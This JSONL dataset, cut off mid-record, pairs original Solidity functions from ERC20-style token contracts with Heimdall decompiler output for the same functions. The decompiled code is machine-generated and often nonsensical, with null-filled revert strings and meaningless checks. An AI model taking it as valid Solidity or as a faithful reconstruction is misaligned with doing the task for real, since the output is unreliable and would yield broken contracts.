{"contract_address": "0x35D17C2467E1D8aB2d8789FD7af72af770BDBc52", "original_solidity_code": "function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\\r\\n      _transfer(sender, recipient, amount);\\r\\n      _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \\\"ERC20: transfer amount exceeds allowance\\\"));\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function transferFrom(address arg0, address arg1, uint256 arg2) public payable {\n        require(address(arg0));\n        require(address(arg1));\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_b = address(arg0);\n        require(address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).code.length);\n        (bool success, bytes memory ret0) = address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).Unresolved_70a08231(var_b); // staticcall\n        require(!(ret0.length < 0x20), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        address var_c = address(arg0);\n        var_d = 0x06;\n        require(!storage_map_b[var_c], \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(var_e.length > 0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        var_c = address(arg0);\n        var_d = 0x04;\n        require(!(arg2 > storage_map_b[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        uint256 var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        var_c = address(arg0);\n        var_d = 0x04;\n        storage_map_b[var_c] = storage_map_b[var_c] - arg2;\n        var_c = address(arg1);\n        var_d = 0x04;\n        require(!((arg2 + storage_map_b[var_c]) < storage_map_b[var_c]), \"SafeMath: addition overflow\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = 0x20;\n        var_i = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        require(!(arg2 > storage_map_b[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        if (!storage_map_b[var_c]) {\n        }\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x23;\n        var_n = this.code[3092:3127];\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x25;\n        var_n = this.code[3239:3276];\n    }"}
{"contract_address": "0x16E04d776e1B647BE948C6D2f51Bca26401DC011", "original_solidity_code": "function symbol() public view virtual override returns (string memory) { return _symbol; }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_l) {\n            if (store_l - ((store_l >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_l >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_l >> 0x01;\n                if (store_l) {\n                    if (store_l - ((store_l >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_l >> 0x01) {\n                            if (0x1f < (store_l >> 0x01)) {\n                                var_a = 0x05;\n                                var_e = storage_map_d[var_a];\n                                if ((0x20 + var_c) + (store_l >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xF47024a2e10D77927767cBE5aADf5F8BB02782c9", "original_solidity_code": "function setLimits(uint256 amount) public onlyOwner {\\r\\n        limits = amount;\\r\\n    }", "heimdall_decompiled_code": "function setLimits(uint256 arg0) public payable {\n        require(arg0 == arg0);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        limits = arg0;\n    }"}
{"contract_address": "0xa5f88146Cff0673fCea44A32ddB845302c835619", "original_solidity_code": "function updateMaxWalletAmount(uint256 newNum) external onlyOwner {\r\n        require(newNum >= (totalSupply() * 5 / 1000)/1e18, \"Cannot set maxWallet lower than 0.5%\");\r\n        maxWallet = newNum * (10**18);\r\n    }", "heimdall_decompiled_code": "function updateMaxWalletAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((totalSupply == ((totalSupply * 0x05) / 0x05)) | !0x05);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x03e8);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0xEEF6196376173FC3F2BeDfe0cFcB355401e1Be51", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x08) {\n            if ((0x01 == 0x01) | !0x3b9aca00) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x3b9aca00;\n                if (0x08) {\n                    if ((0x01 == 0x01) | !0x3b9aca00) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x3b9aca00;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x08) {\n                            if ((0x01 == 0x01) | !0x3b9aca00) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x3b9aca00;\n                                emit MaxTxAmountUpdated(0x3b9aca00);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x08 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                                                    if (!0x08 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x172F7a6F8C76321376cf077c4b68f6C0A0907d2f", "original_solidity_code": "function manualSend() external onlyOwner {\r\n        uint256 contractETHBalance = address(this).balance;\r\n        payable(marketingWallet).transfer(contractETHBalance);\r\n    }", "heimdall_decompiled_code": "function manualSend() public {\n        require(address(msg.sender) == (address(getOwner / 0x01)), \"!Owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x06;\n        var_e = 0x214f776e65720000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(marketingWallet / 0x01).transfer(address(this).balance);\n    }"}
{"contract_address": "0xB44A4AEbE8Fa44847a517Fe02d8dAf36Ab5487f5", "original_solidity_code": "function approve(address spender, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Moves `amount` tokens from `from` to `to` using the\\n     * allowance mechanism. `amount` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer}", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x5Bfdf57678baFB4eBB2c09279ac382397F3006b6", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\nreturn tokenFromReflection(_rOwned[account]);\r\n}", "heimdall_decompiled_code": "function balanceOf(address arg0) public view {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x02;\n        require(!(storage_map_l[var_a] > store_m), \"Amount must be less than total reflections\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2a;\n        var_f = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_g = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_h = 0x40 + var_h;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x0de0b6b3a7640000, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_h.length;\n        require(!(0 > var_h.length), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_k = 0;\n        var_l = var_m;\n        require(!(0x20 > var_h.length), \"SafeMath: division by zero\");\n        var_k = 0;\n        if (0x0de0b6b3a7640000) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            require(0x0de0b6b3a7640000);\n        }\n    }"}
{"contract_address": "0x2Ceb4C183733343E17f5EfE54cD214238a1A2001", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0);\n        require(address(arg0) - 0);\n        require(arg1 > 0);\n        require(address(msg.sender) == (address(owner / 0x01)));\n        require(address(arg0) == (address(owner / 0x01)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a] / 0x01));\n        require(!bytes1(storage_map_b[var_a] / 0x01));\n        require(store_c > store_d, \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_e == ((arg1 * store_e) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_e) / arg1) == store_e, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x21;\n        var_h = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_i = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_f = 0x40 + var_f;\n        var_d = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        uint256 var_i = var_f.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(address(msg.sender) == (address(store_f / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_f / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_f / 0x01))), \"SafeMath: addition overflow\");\n        require(!(!(address(arg0)) == (address(store_f / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(arg0);\n        var_b = 0x03;\n        require(!(!bytes1(storage_map_b[var_a] / 0x01)), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_f / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_f / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_e) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + ((arg1 * store_e) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(storage_map_b[var_a] + ((arg1 * store_e) / 0x64) < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] + ((arg1 * store_e) / 0x64);\n        uint256 var_k = (arg1 * store_e) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_e) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_f = 0x40 + var_f;\n        var_k = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_f = 0x40 + var_f;\n        var_p = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_e) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_r = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_s = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        uint256 var_t = var_f.length;\n        uint256 var_u = 0;\n        var_v = var_n;\n        var_u = 0;\n        if (!(arg1 - ((arg1 * store_e) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_c > store_h) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_f / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_c > store_j) {\n                if (arg1 - 0) {\n                }\n                if (arg1 - 0) {\n                }\n                require(!((arg1 - ((arg1 * store_e) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_c > store_j, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_l / 0x01))) {\n            if (address(arg0) == (address(store_l / 0x01))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x29;\n        var_h = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_i = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xF37412281Cb92fb10ccA519C55F0276BAFa6Ea2f", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x3b9aca00) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x3b9aca00;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x3b9aca00) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x3b9aca00;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x3b9aca00) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x3b9aca00;\n                                emit MaxTxAmountUpdated(0x3b9aca00);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x5352d5312F76de5a8f335d7df9301c6A4a209b0e", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\\n\\t\\tassert(swapEnabled);\\n        return _balances[account];\\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        require(bytes1(store_c / 0x0100000000000000000000000000000000000000000000));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x01;\n        address var_a = address(arg0);\n        var_c = 0x01;\n        address var_d = storage_map_d[var_a];\n        return storage_map_d[var_a];\n    }"}
{"contract_address": "0x31F2C94D3EF63551FF418747EbBe67E5A083aDC0", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        emit OwnershipTransferred(_owner, address(0));\\n        _owner = address(0);\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0x210a768a5146f4d3C1068bB37dD780304c6D648D", "original_solidity_code": "function openTrading() external onlyOwner() {\n        require(!tradingOpen,\"trading is already open\");\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\n        swapEnabled = true;\n        tradingOpen = true;\n        firstBlock = block.number;\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_f / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        address var_e = address(this);\n        var_f = 0x01;\n        var_a = 0xf305d71900000000000000000000000000000000000000000000000000000000;\n        address var_b = address(this);\n        address var_c = storage_map_m[var_e];\n        uint256 var_d = 0;\n        uint256 var_g = 0;\n        address var_h = address(owner);\n        uint256 var_i = block.timestamp;\n        (bool success, bytes memory ret0) = address(store_l).{ value: address(this).balance }Unresolved_f305d719(var_b); // call\n        uint256 var_j = var_j + (uint248(ret0.length + 0x1f));\n        require(!((var_j + ret0.length) - var_j) < 0x60);\n        var_k = 0x095ea7b300000000000000000000000000000000000000000000000000000000;\n        var_c = address(store_l);\n        var_d = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        (bool success, bytes memory ret0) = address(store_f).Unresolved_095ea7b3(var_c); // call\n        var_j = var_j + (uint248(ret0.length + 0x1f));\n        require(!((var_j + ret0.length) - var_j) < 0x20);\n        require(var_j.length == var_j.length);\n        store_f = 0x0100010000000000000000000000000000000000000000 | (uint240(store_f));\n        store_n = block.number;\n    }"}
{"contract_address": "0x4a332C2EE399881195E10544033c2378E732e2C2", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0);\n        require(address(arg0) - 0);\n        require(arg1 > 0);\n        require(address(msg.sender) == (address(owner / 0x01)));\n        require(address(arg0) == (address(owner / 0x01)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a] / 0x01));\n        require(!bytes1(storage_map_b[var_a] / 0x01));\n        require(store_c > store_d, \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_e == ((arg1 * store_e) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_e) / arg1) == store_e, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x21;\n        var_h = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_i = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_f = 0x40 + var_f;\n        var_d = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, 